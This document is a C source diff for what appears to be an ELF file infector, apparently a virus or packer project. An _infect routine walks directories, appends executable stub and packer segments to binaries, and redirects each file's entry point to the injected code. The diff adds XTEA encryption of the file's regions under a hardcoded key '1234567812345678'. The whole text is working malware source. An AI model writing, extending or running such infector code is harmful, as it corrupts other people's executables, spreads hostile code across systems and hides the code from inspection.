@@ -12,6 +12,7 @@
 #include <sys/syscall.h>
 #include "elf_reader.h"
 #include "utils.h"
+#include "encrypt.h"
 #include "protect_range.h"
 #include "stub/32/stub_def.h"
 #include "stub/64/stub_def.h"
@@ -70,17 +71,10 @@ typedef struct {
 // Static function declarations
 // ---
 
-static void				_inject(
+static bool				_inject(
 							t_elf_file *s,
 							size_t first_entry_index,
 							int interp_idx,
-							t_ranges *bss_ranges,
-							t_ranges *protected_ranges);
-
-static void				_pack(
-							t_elf_file *s,
-							size_t first_entry_index,
-							t_ranges *bss_ranges,
 							t_ranges *protected_ranges);
 
 static void				_populate_stub_data(
@@ -97,6 +91,11 @@ static void				_list_recursive(
 							t_file_cb cb,
 							void *ctx);
 
+static void				_encrypt(
+							t_elf_file *s,
+							t_ranges *ranges,
+							const char *key);
+
 // ---
 // Extern function definitions
 // ---
@@ -105,7 +104,6 @@ static void _infect(const char *path, void *ctx) {
 	t_elf_file	s;
 	int			interp_idx;
 	int			first_idx;
-	t_ranges	bss_ranges = list_new();
 	t_ranges	protected_ranges = list_new();
 
 	UNUSED(ctx);
@@ -124,8 +122,12 @@ static void _infect(const char *path, void *ctx) {
 		return ;
 	}
 
-	_inject(&s, first_idx, interp_idx, &bss_ranges, &protected_ranges);
-	_pack(&s, first_idx, &bss_ranges, &protected_ranges);
+	if (!_inject(&s, first_idx, interp_idx, &protected_ranges)) {
+		list_free(&protected_ranges);
+		elf_manager_close(&s);
+		return ;
+	}
+	_encrypt(&s, &protected_ranges, "1234567812345678");
 
 	if (elf_manager_finalize(&s, path) != EXIT_FAILURE) {
 		verbose("infected path: %s\n", path);
@@ -213,23 +215,35 @@ static void	_populate_packer_data(
 		+ s->hdl.ph.get.offset(s, packer_idx)
 		+ s->hdl.ph.get.memsz(s, packer_idx)
 		- packer_data_size;
+	t_range *last_range = s->data + s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES)
+		+ s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES) - sizeof(t_range);
+	*last_range = MAKE_RANGE(s->hdl.ph.get.offset(s, packer_idx), SIZE_MAX);
 
 	if (s->is_64) {
 		t_packer_64_data *d = packer_data;
 		d->packer_virt_off = s->hdl.ph.get.vaddr(s, packer_idx);
 		d->entry_point = s->hdl.eh.get.entry(s);
+		d->bss_ranges_ptr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES);
+		d->bss_ranges_len = s->hdl.ph.get.memsz(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES) / sizeof(t_range);
+		d->ranges_ptr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES);
+		d->ranges_len = s->hdl.ph.get.memsz(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES) / sizeof(t_range);
+		memcpy(&d->key, "1234567812345678", 16);
 	} else {
 		t_packer_32_data *d = packer_data;
 		d->packer_virt_off = s->hdl.ph.get.vaddr(s, packer_idx);
 		d->entry_point = s->hdl.eh.get.entry(s);
+		d->bss_ranges_ptr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES);
+		d->bss_ranges_len = s->hdl.ph.get.memsz(s, first_entry_index + PHT_IDX_PACKER_BSS_RANGES) / sizeof(t_range);
+		d->ranges_ptr = s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES);
+		d->ranges_len = s->hdl.ph.get.memsz(s, first_entry_index + PHT_IDX_PACKER_PROTECTED_RANGES) / sizeof(t_range);
+		memcpy(&d->key, "1234567812345678", 16);
 	}
 }
 
-static void	_inject(
+static bool	_inject(
 				t_elf_file *s,
 				size_t first_entry_index,
 				int interp_idx,
-				t_ranges *bss_ranges,
 				t_ranges *protected_ranges) {
 	const char	*stub_start;
 	const char	*stub_end;
@@ -239,6 +253,7 @@ static void	_inject(
 	const char	*packer_end;
 	const char	*packer_load_start;
 	const char	*packer_load_end;
+	t_ranges	bss_ranges = list_new();
 
 	stub_start = s->is_64 ? _stub64_bin_start : _stub32_bin_start;
 	stub_end = s->is_64 ? _stub64_bin_end : _stub32_bin_end;
@@ -251,14 +266,14 @@ static void	_inject(
 
 	verbose("getting protected ranges...");
 	if (!elf_get_protected_ranges(s, protected_ranges))
-		return ;
+		return (false);
 	range_aggregate(protected_ranges);
 	verbose("%zu found !\n", protected_ranges->len);
 
 	verbose("getting bss ranges...");
-	if (!elf_get_bss_vaddr_ranges(s, bss_ranges))
-		return ;
-	verbose("%zu found !\n", bss_ranges->len);
+	if (!elf_get_bss_vaddr_ranges(s, &bss_ranges))
+		return (false);
+	verbose("%zu found !\n", bss_ranges.len);
 
 	verbose("append stub...");
 	elf_append_loadable_data_and_locate(s, stub_start, stub_end - stub_start, 0x1000, 0x20, first_entry_index + PHT_IDX_STUB, PF_X | PF_R | PF_W);
@@ -278,6 +293,11 @@ static void	_inject(
 	elf_append_loadable_data_and_locate(s, packer_start, packer_end - packer_start, 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER, PF_X | PF_R | PF_W);
 	verbose("done !\n");
 
+	verbose("append packer load...");
+	elf_append_loadable_data_and_locate(s, packer_load_start, packer_load_end - packer_load_start,
+									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_PACKER32_LOAD : PHT_IDX_PACKER64_LOAD), PF_R);
+	verbose("done !\n");
+
 	list_push(protected_ranges, MAKE_RANGE(0, 0));
 
 	verbose("append protected ranges...");
@@ -287,13 +307,10 @@ static void	_inject(
 
 	verbose("append bss ranges...");
 	elf_append_loadable_data_and_locate(s,
-		bss_ranges->data, (bss_ranges->len) * sizeof(*bss_ranges->data), 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER_BSS_RANGES, PF_R);
+		bss_ranges.data, (bss_ranges.len) * sizeof(*bss_ranges.data), 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER_BSS_RANGES, PF_R);
 	verbose("done !\n");
 
-	verbose("append packer load...");
-	elf_append_loadable_data_and_locate(s, packer_load_start, packer_load_end - packer_load_start,
-									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_PACKER32_LOAD : PHT_IDX_PACKER64_LOAD), PF_R);
-	verbose("done !\n");
+	list_free(&bss_ranges);
 
 	elf_append_loadable_data(s,
 						s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER),
@@ -314,42 +331,27 @@ static void	_inject(
 	range_aggregate(protected_ranges);
 
 	s->hdl.eh.set.entry(s, s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER));
+	return (true);
 }
 
-static void	_pack(
+static void	_encrypt(
 				t_elf_file *s,
-				size_t first_entry_index,
-				t_ranges *bss_ranges,
-				t_ranges *protected_ranges) {
-	const char	*packer_start;
-	const char	*packer_end;
-	const char	*packer_load_start;
-	const char	*packer_load_end;
-
-	packer_start = s->is_64 ? _packer64_bin_start : _packer32_bin_start;
-	packer_end = s->is_64 ? _packer64_bin_end : _packer32_bin_end;
-	packer_load_start = !s->is_64 ? _packer64_bin_start : _packer32_bin_start;
-	packer_load_end = !s->is_64 ? _packer64_bin_end : _packer32_bin_end;
-
-	verbose("append packer...");
-	elf_append_loadable_data_and_locate(s, packer_start, packer_end - packer_start, 0x1000, 0x20, first_entry_index + PHT_IDX_PACKER, PF_X | PF_R | PF_W);
-	verbose("done !\n");
-
-	verbose("append packer load...");
-	elf_append_loadable_data_and_locate(s, packer_load_start, packer_load_end - packer_load_start,
-									0x1000, 0x20, first_entry_index + (s->is_64 ? PHT_IDX_PACKER32_LOAD : PHT_IDX_PACKER64_LOAD), PF_R);
-	verbose("done !\n");
-
-	elf_append_loadable_data(s,
-						s->hdl.ph.get.offset(s, first_entry_index + PHT_IDX_PACKER),
-						s->hdl.ph.get.filesz(s, first_entry_index + PHT_IDX_PACKER),
-						0x1000, first_entry_index + (s->is_64 ? PHT_IDX_PACKER64_LOAD : PHT_IDX_PACKER32_LOAD), PF_R);
-
-	verbose("populating packer data...");
-	_populate_packer_data(s, first_entry_index);
-	verbose("done !\n");
-
-	s->hdl.eh.set.entry(s, s->hdl.ph.get.vaddr(s, first_entry_index + PHT_IDX_PACKER));
+				t_ranges *ranges,
+				const char *key) {
+	if (ranges->len == 0)
+		return ; // MUST NEVER APPEND
+	// xtea_encrypt((char *)s->data, ALIGN_DOWN(ranges->data[0].off, 8), (const uint32_t *)"1234567812345678");
+	verbose("encrypt:\n");
+	for (size_t k = 0; k < ranges->len - 1 && ranges->len != 0; ++k) {
+		auto const	start_off = ALIGN_UP(ranges->data[k].off + ranges->data[k].len, 8);
+		auto const	size = (off_t)ALIGN_DOWN(MIN(ranges->data[k + 1].off - (off_t)start_off, (off_t)(s->size - start_off)), 8);
+		if (size <= 0)
+			continue;
+		xtea_encrypt((char *)s->data + start_off, size, (const uint32_t *)key);
+		verbose("  %llx -> %llx\n", start_off, start_off + size - 1);
+	}
+	// auto const start_off = ALIGN_UP(ranges->data[ranges->len - 1].off + ranges->data[ranges->len - 1].len, 8);
+	// xtea_encrypt((char *)s->data + start_off, ALIGN_DOWN((off_t)(s->size - start_off), 8), (const uint32_t *)"1234567812345678");
 }
 
 static t_buf __buf_new(
